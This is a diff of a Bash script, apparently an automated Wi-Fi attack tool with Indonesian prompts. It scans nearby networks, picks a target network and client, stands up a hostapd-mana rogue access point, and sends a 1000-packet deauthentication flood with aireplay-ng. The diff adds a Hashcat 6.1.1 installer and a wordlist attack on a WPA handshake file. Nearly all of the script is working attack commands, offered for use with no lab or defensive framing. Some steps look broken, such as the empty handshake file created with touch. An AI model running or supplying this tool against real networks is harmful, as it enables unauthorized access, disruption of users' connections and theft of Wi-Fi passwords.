@@ -1,7 +1,7 @@
 #!/bin/bash
 slow_echo() {
     text="$1"
-    delay="$2" # waktu penundaan dalam detik
+    delay="$2" 
     for ((i=0; i<${#text}; i++)); do
         echo -n "${text:i:1}"
         sleep "$delay"
@@ -11,27 +11,24 @@ slow_echo() {
 
 cat <<\EOF
 
-#       ..                 .                      ...     ..                           ..       ..              
-#    :**888H: `: .xH""    @88>                 .=*8888x <"?88h.                  x .d88"  x .d88"    ..         
-#   X   `8888k XX888      %8P      .u    .    X>  '8888H> '8888      x.    .      5888R    5888R    @L          
-#  '8hx  48888 ?8888       .     .d88B :@8c  '88h. `8888   8888    .@88k  z88u    '888R    '888R   9888i   .dL  
-#  '8888 '8888 `8888     .@88u  ="8888f8888r '8888 '8888    "88>  ~"8888 ^8888     888R     888R   `Y888k:*888. 
-#   %888>'8888  8888    ''888E`   4888>'88"   `888 '8888.xH888x.    8888  888R     888R     888R     888E  888I 
-#     "8 '888"  8888      888E    4888> '       X" :88*~  `*8888>   8888  888R     888R     888R     888E  888I 
-#    .-` X*"    8888      888E    4888>       ~"   !"`      "888>   8888  888R     888R     888R     888E  888I 
-#      .xhx.    8888      888E   .d888L .+     .H8888h.      ?88    8888 ,888B .   888R     888R     888E  888I 
-#    .H88888h.~`8888.>    888&   ^"8888*"     :"^"88888h.    '!    "8888Y 8888"   .888B .  .888B .  x888N><888' 
-#   .~  `%88!` '888*~     R888"     "Y"       ^    "88888hx.+"      `Y"   'YP     ^*888%   ^*888%    "88"  888  
-#         `"     ""        ""                        ^"**""                         "%       "%            88F  
-#                                                                                                         98"   
-#                                                                                                       ./"     
-#                                                                                                      ~`       
+       ..                 .                      ...     ..                           ..       ..              
+    :**888H: `: .xH""    @88>                 .=*8888x <"?88h.                  x .d88"  x .d88"    ..         
+   X   `8888k XX888      %8P      .u    .    X>  '8888H> '8888      x.    .      5888R    5888R    @L          
+  '8hx  48888 ?8888       .     .d88B :@8c  '88h. `8888   8888    .@88k  z88u    '888R    '888R   9888i   .dL  
+  '8888 '8888 `8888     .@88u  ="8888f8888r '8888 '8888    "88>  ~"8888 ^8888     888R     888R   `Y888k:*888. 
+   %888>'8888  8888    ''888E`   4888>'88"   `888 '8888.xH888x.    8888  888R     888R     888R     888E  888I 
+     "8 '888"  8888      888E    4888> '       X" :88*~  `*8888>   8888  888R     888R     888R     888E  888I 
+    .-` X*"    8888      888E    4888>       ~"   !"`      "888>   8888  888R     888R     888R     888E  888I 
+      .xhx.    8888      888E   .d888L .+     .H8888h.      ?88    8888 ,888B .   888R     888R     888E  888I 
+    .H88888h.~`8888.>    888&   ^"8888*"     :"^"88888h.    '!    "8888Y 8888"   .888B .  .888B .  x888N><888' 
+   .~  `%88!` '888*~     R888"     "Y"       ^    "88888hx.+"      `Y"   'YP     ^*888%   ^*888%    "88"  888  
+         `"     ""        ""                        ^"**""                         "%       "%            88F  
+                                                                                                         98"   
+                                                                                                       ./"     
+                                                                                                      ~`       
 EOF
 
-# Menampilkan copyright setelah art
 slow_echo "(c) Copyright by LTFZP (F.R.I.D.A.Y) 2025" 0.1
-
-# ================== WELCOME MESSAGE ==================
 
 echo -e "\n"
 echo "==========================================="
@@ -41,7 +38,6 @@ slow_echo " Don't cry if you break your Wi-Fi adapter." 0.1
 echo "==========================================="
 sleep 2
 
-# ================== FUNCTIONS ==================
 
 check_dependencies() {
     local missing=()
@@ -106,8 +102,80 @@ check_dependencies() {
         fi
     fi
 }
-check_dependencies
-# Fungsi konfirmasi y/n
+
+install_hashcat() {
+    echo "==========================================="
+    echo "   🔥  Hashcat 6.1.1 Setup"
+    echo "==========================================="
+
+    if command -v hashcat &>/dev/null; then
+        current_version=$(hashcat --version | sed 's/^v//' | awk '{print $1}')
+        if [[ "$current_version" == "6.1.1" ]]; then
+            echo ""
+            echo "✅ Hashcat 6.1.1 sudah terinstall. Melewati instalasi."
+            sleep 1
+            return
+        else
+            echo ""
+            echo "⚠️ WARNING: Hashcat versi terdeteksi $current_version."
+            echo "Tool ini membutuhkan **tepat** Hashcat versi 6.1.1 untuk otomatisasi cracking."
+            echo "Menginstal akan MENGGANTIKAN instalasi Hashcat kamu saat ini."
+        fi
+    else
+        echo ""
+        echo "⚠️ Hashcat belum ditemukan di sistem."
+    fi
+
+    echo ""
+    if confirm "Apakah Anda ingin mengunduh dan menginstal Hashcat 6.1.1 sekarang?"; then
+        echo ""
+        echo "⌛ Mengunduh Hashcat 6.1.1..."
+        curl -LO https://hashcat.net/files/hashcat-6.1.1.7z
+
+        if [ ! -f "hashcat-6.1.1.7z" ]; then
+            echo "❌ Gagal mengunduh Hashcat. Cek koneksi internet Anda."
+            exit 1
+        fi
+
+        echo ""
+        echo "📦 Mengekstrak hashcat-6.1.1.7z..."
+        if ! command -v 7z &>/dev/null; then
+            echo "7z diperlukan untuk ekstrak file .7z."
+            if confirm "Install p7zip-full sekarang?"; then
+                sudo apt update
+                sudo apt install -y p7zip-full
+            else
+                echo "❌ Tidak bisa melanjutkan tanpa 7z. Exiting."
+                exit 1
+            fi
+        fi
+
+        7z x hashcat-6.1.1.7z > /dev/null
+
+        if [ ! -d "hashcat-6.1.1" ]; then
+            echo "❌ Ekstraksi gagal. Ada masalah saat unpacking."
+            exit 1
+        fi
+
+        echo ""
+        echo "🚀 Memindahkan Hashcat 6.1.1 ke /usr/local/bin..."
+        sudo rm -rf /usr/local/bin/hashcat-6.1.1
+        sudo mv hashcat-6.1.1 /usr/local/bin/hashcat-6.1.1
+
+        sudo ln -sf /usr/local/bin/hashcat-6.1.1/hashcat.bin /usr/local/bin/hashcat
+
+        echo ""
+        echo "✅ Hashcat 6.1.1 berhasil diinstall!"
+        hashcat --version
+        sleep 1
+    else
+        echo ""
+        echo "❌ Instalasi Hashcat 6.1.1 dibatalkan."
+        echo "Fitur cracking otomatis tidak akan tersedia."
+        sleep 2
+    fi
+}
+
 confirm() {
     while true; do
         read -rp "$1 (y/n): " yn
@@ -119,7 +187,9 @@ confirm() {
     done
 }
 
-# Fungsi input angka
+check_dependencies
+install_hashcat
+
 get_number_input() {
     local prompt=$1
     local input
@@ -133,26 +203,24 @@ get_number_input() {
         fi
     done
 }
-# Fungsi konversi HEX ke ASCII
 hex_to_ascii() {
     echo "$1" | xxd -r -p 2>/dev/null
 }
 
-# Fungsi membuka terminal baru
 launch_terminal() {
     local cmd=$1
     if command -v gnome-terminal &>/dev/null; then
-        gnome-terminal -- bash -c "$cmd"
+        gnome-terminal -- bash -c "$cmd" &
     elif command -v konsole &>/dev/null; then
-        konsole -e bash -c "$cmd"
+        konsole -e bash -c "$cmd" &
     elif command -v xterm &>/dev/null; then
-        xterm -e "$cmd"
+        xterm -e "$cmd" &
     elif command -v mate-terminal &>/dev/null; then
-        mate-terminal -- bash -c "$cmd"
+        mate-terminal -- bash -c "$cmd" &
     elif command -v xfce4-terminal &>/dev/null; then
-        xfce4-terminal -- bash -c "$cmd"
+        xfce4-terminal -- bash -c "$cmd" &
     elif command -v tilix &>/dev/null; then
-        tilix -e bash -c "$cmd"
+        tilix -e bash -c "$cmd" &
     else
         echo "No compatible terminal emulator found."
         exit 1
@@ -162,26 +230,24 @@ launch_terminal() {
 clear 
 cat <<\EOF
 
-#       ..                 .                      ...     ..                           ..       ..              
-#    :**888H: `: .xH""    @88>                 .=*8888x <"?88h.                  x .d88"  x .d88"    ..         
-#   X   `8888k XX888      %8P      .u    .    X>  '8888H> '8888      x.    .      5888R    5888R    @L          
-#  '8hx  48888 ?8888       .     .d88B :@8c  '88h. `8888   8888    .@88k  z88u    '888R    '888R   9888i   .dL  
-#  '8888 '8888 `8888     .@88u  ="8888f8888r '8888 '8888    "88>  ~"8888 ^8888     888R     888R   `Y888k:*888. 
-#   %888>'8888  8888    ''888E`   4888>'88"   `888 '8888.xH888x.    8888  888R     888R     888R     888E  888I 
-#     "8 '888"  8888      888E    4888> '       X" :88*~  `*8888>   8888  888R     888R     888R     888E  888I 
-#    .-` X*"    8888      888E    4888>       ~"   !"`      "888>   8888  888R     888R     888R     888E  888I 
-#      .xhx.    8888      888E   .d888L .+     .H8888h.      ?88    8888 ,888B .   888R     888R     888E  888I 
-#    .H88888h.~`8888.>    888&   ^"8888*"     :"^"88888h.    '!    "8888Y 8888"   .888B .  .888B .  x888N><888' 
-#   .~  `%88!` '888*~     R888"     "Y"       ^    "88888hx.+"      `Y"   'YP     ^*888%   ^*888%    "88"  888  
-#         `"     ""        ""                        ^"**""                         "%       "%            88F  
-#                                                                                                         98"   
-#                                                                                                       ./"     
-#                                                                                                      ~`       
+       ..                 .                      ...     ..                           ..       ..              
+    :**888H: `: .xH""    @88>                 .=*8888x <"?88h.                  x .d88"  x .d88"    ..         
+   X   `8888k XX888      %8P      .u    .    X>  '8888H> '8888      x.    .      5888R    5888R    @L          
+  '8hx  48888 ?8888       .     .d88B :@8c  '88h. `8888   8888    .@88k  z88u    '888R    '888R   9888i   .dL  
+  '8888 '8888 `8888     .@88u  ="8888f8888r '8888 '8888    "88>  ~"8888 ^8888     888R     888R   `Y888k:*888. 
+   %888>'8888  8888    ''888E`   4888>'88"   `888 '8888.xH888x.    8888  888R     888R     888R     888E  888I 
+     "8 '888"  8888      888E    4888> '       X" :88*~  `*8888>   8888  888R     888R     888R     888E  888I 
+    .-` X*"    8888      888E    4888>       ~"   !"`      "888>   8888  888R     888R     888R     888E  888I 
+      .xhx.    8888      888E   .d888L .+     .H8888h.      ?88    8888 ,888B .   888R     888R     888E  888I 
+    .H88888h.~`8888.>    888&   ^"8888*"     :"^"88888h.    '!    "8888Y 8888"   .888B .  .888B .  x888N><888' 
+   .~  `%88!` '888*~     R888"     "Y"       ^    "88888hx.+"      `Y"   'YP     ^*888%   ^*888%    "88"  888  
+         `"     ""        ""                        ^"**""                         "%       "%            88F  
+                                                                                                         98"   
+                                                                                                       ./"     
+                                                                                                      ~`       
 EOF
 
-# Menampilkan copyright setelah art
 echo "(c) Copyright by LTFZP (F.R.I.D.A.Y) 2025"
-# 1. Pilih interface wireless
 wlan_list=($(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^lo$'))
 wlan_count=${#wlan_list[@]}
 
@@ -203,7 +269,6 @@ TARGET_IFACE="${wlan_list[$wlan_index]}"
 
 echo "Using interface: $TARGET_IFACE"
 
-# 2. Scanning Awal
 SCAN_FILE="discovery-initial-$(date +%s)"
 echo "Initiating preliminary scan and saving output to pcap: $SCAN_FILE"
 
@@ -212,14 +277,12 @@ launch_terminal "sudo airodump-ng $TARGET_IFACE -w $SCAN_FILE --output-format pc
 echo "Press CTRL+C in the scanning terminal when sufficient data is collected."
 read -p "Press [ENTER] after completing the initial scan..."
 
-# Ambil file pcap terbaru
 initial_pcap=$(ls -t ${SCAN_FILE}-*.cap 2>/dev/null | head -n 1)
 if [ -z "$initial_pcap" ]; then
     echo "Failed to retrieve initial pcap file."
     exit 1
 fi
 
-# Ambil daftar ESSID unik
 echo "Extracting ESSIDs from file: $initial_pcap"
 mapfile -t raw_essid_list < <(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && wlan.ssid != \"\"" -T fields -e wlan.ssid | sort -u)
 
@@ -228,20 +291,17 @@ if [ ${#raw_essid_list[@]} -eq 0 ]; then
     exit 1
 fi
 
-# Decode semua ESSID yang ditemukan
 decoded_essid_list=()
 for hex_essid in "${raw_essid_list[@]}"; do
     decoded_ssid=$(hex_to_ascii "$hex_essid")
     decoded_essid_list+=("$decoded_ssid")
 done
 
-# Tampilkan ke user nama WiFi asli
 echo "Discovered ESSIDs:"
 for i in "${!decoded_essid_list[@]}"; do
     echo "$i) ${decoded_essid_list[$i]}"
 done
 
-# Pilih target
 essid_index=$(get_number_input "Select target ESSID (number): ")
 TARGET_ESSID="${decoded_essid_list[$essid_index]}"
 TARGET_RAW_ESSID="${raw_essid_list[$essid_index]}"
@@ -251,10 +311,8 @@ sleep 0.2
 
 clear 
 
-# 3. Cek RSN untuk target ESSID
 echo "Checking RSN parameters for target ESSID: $TARGET_ESSID"
 
-# Ambil AKM Suite Type dari PCAP
 akms_types=$(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && frame contains \"$TARGET_ESSID\"" -T fields -e wlan.rsn.akms.type 2>/dev/null)
 
 if [[ -z "$akms_types" ]]; then
@@ -262,12 +320,10 @@ if [[ -z "$akms_types" ]]; then
     exit 1
 fi
 
-# Gabungkan semua hasil jadi satu baris
 all_types=$(echo "$akms_types" | tr '\n' ',' | tr -s ',' ',' | sed 's/,$//')
 
 echo "AKM Suite Types detected: $all_types"
 
-# Cek apakah ada tipe 2 (PSK) atau 6 (PSK-SHA256)
 if echo "$all_types" | grep -E -q "(^|,)2(,|$)|(^|,)6(,|$)"; then
     echo "✅ Target supports PSK or PSK-SHA256. Attack can proceed."
 else
@@ -275,7 +331,6 @@ else
     exit 1
 fi
 
-# 3.5. Setup Interface untuk Rogue AP dan Monitor Mode
 echo ""
 echo "Re-examining wireless interfaces for Rogue AP and Monitor configuration..."
 
@@ -301,8 +356,9 @@ fi
 
 echo "Rogue AP Interface: $TARGET_AP_IFACE"
 echo "Monitor Interface : $TARGET_MONITOR_IFACE"
-
-# 4. Buat config hostapd-mana
+echo "Creating hccapx file: ${TARGET_ESSID}-handshake.hccapx"
+sudo touch ${TARGET_ESSID}-handshake.hccapx
+sleep 0.2
 CONFIG_FILE="hostapd-${TARGET_ESSID}.conf"
 echo "Creating configuration file: $CONFIG_FILE"
 
@@ -325,7 +381,6 @@ EOF
 
 echo "Configuration successfully created."
 
-# [SETELAH PILIH ESSID, langsung ambil BSSID]
 echo "Identifying BSSID for target ESSID..."
 TARGET_BSSID=$(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && wlan.ssid == \"$TARGET_ESSID\"" -T fields -e wlan.bssid | sort -u | head -n 1)
 
@@ -336,7 +391,6 @@ fi
 
 echo "Target BSSID: $TARGET_BSSID"
 
-# 5.1 Scanning Client Potensial
 echo "Initiating scan for clients connected to target BSSID..."
 
 CLIENT_SCAN_FILE="client-scan-$(date +%s)"
@@ -347,7 +401,6 @@ launch_terminal "sudo airodump-ng $TARGET_MONITOR_IFACE -w $CLIENT_SCAN_FILE --b
 echo "Press CTRL+C in the client scanning terminal when sufficient data is collected."
 read -p "Press [ENTER] after completing the client scan..."
 
-# Ambil file pcap baru
 client_pcap=$(ls -t ${CLIENT_SCAN_FILE}-*.cap 2>/dev/null | head -n 1)
 
 if [[ -z "$client_pcap" ]]; then
@@ -357,7 +410,6 @@ fi
 
 echo "Client pcap file: $client_pcap"
 
-# Parse client list dari pcap
 mapfile -t client_list < <(tshark -r "$client_pcap" -Y "(wlan.fc.type_subtype >= 0x20 && wlan.fc.type_subtype <= 0x2f) && wlan.bssid == $TARGET_BSSID" -T fields -e wlan.sa | grep -v "$TARGET_BSSID" | sort -u)
 
 if [ ${#client_list[@]} -eq 0 ]; then
@@ -375,13 +427,66 @@ TARGET_CLIENT_MAC="${client_list[$client_index]}"
 
 echo "Target client selected: $TARGET_CLIENT_MAC"
 
-# 6. Jalankan hostapd-mana
-echo "Executing hostapd-mana for Rogue AP deployment..."
-sudo hostapd-mana "$CONFIG_FILE" -dd &
-echo "Run in a new terminal to monitor output with command: sudo hostapd-mana $CONFIG_FILE -dd"
+echo "Starting hostapd-mana for Rogue AP deployment in a new terminal..."
+
+# Jalankan hostapd-mana di TERMINAL BARU, bukan background biasa
+launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\" -dd"
 
 sleep 3
 
-# 7. Deauth target client
-echo "Initiating deauthentication attack against target client..."
-launch_terminal "sudo aireplay-ng --deauth 1000 -a $TARGET_BSSID -c $TARGET_CLIENT_MAC $TARGET_MONITOR_IFACE"
+echo ""
+echo "Initiating deauthentication attack against target client in another terminal..."
+launch_terminal "echo 'Deauth Attack - Tekan CTRL+C untuk stop'; sudo aireplay-ng --deauth 1000 -a $TARGET_BSSID -c $TARGET_CLIENT_MAC $TARGET_MONITOR_IFACE"
+
+# Tunggu user konfirmasi setelah deauth selesai
+echo ""
+read -rp "Tekan [ENTER] di terminal utama ini setelah deauth selesai untuk lanjut..."
+
+# Tanya lagi sebelum matikan hostapd-mana
+read -rp "Tekan [ENTER] sekali lagi untuk menghentikan hostapd-mana dan lanjut ke pengecekan handshake..."
+
+# Coba bunuh hostapd-mana berdasarkan nama process (supaya clean)
+echo "Memberhentikan hostapd-mana..."
+sudo pkill -f "hostapd-mana \"$CONFIG_FILE\""
+
+sleep 2
+
+
+# Cek apakah file handshake ada dan berisi
+if command -v hashcat &>/dev/null; then
+    hashcat_version=$(hashcat --version | sed 's/^v//' | awk '{print $1}')
+    echo "Versi hashcat terdeteksi: $hashcat_version"
+
+    required_version="6.1.1"
+
+    version_compare() {
+        printf '%s\n%s' "$1" "$2" | sort -C -V
+    }
+
+    if version_compare "$hashcat_version" "$required_version"; then
+        echo "✅ Hashcat versi memenuhi syarat."
+
+        # Tanya ke user untuk path wordlist
+        echo ""
+        read -rp "Masukkan path lengkap ke wordlist untuk brute-force (contoh: /home/user/wordlist.txt): " WORDLIST_PATH
+
+        if [ ! -f "$WORDLIST_PATH" ]; then
+            echo "❌ Wordlist tidak ditemukan di path: $WORDLIST_PATH"
+            exit 1
+        fi
+
+        echo ""
+        echo "Memulai serangan brute-force dengan hashcat..."
+        echo "Command: sudo hashcat -a 0 -m 2500 \"${TARGET_ESSID}-handshake.hccapx\" \"$WORDLIST_PATH\" --force"
+
+        sudo hashcat -a 0 -m 2500 "${TARGET_ESSID}-handshake.hccapx" "$WORDLIST_PATH" --force
+
+        echo "✅ Hashcat selesai dijalankan."
+    else
+        echo "⚠️ Hashcat ditemukan, tapi versinya kurang dari $required_version."
+        echo "Melewati proses brute-force otomatis."
+    fi
+else
+    echo "⚠️ Hashcat tidak ditemukan di sistem."
+    echo "Melewati proses brute-force otomatis."
+fi
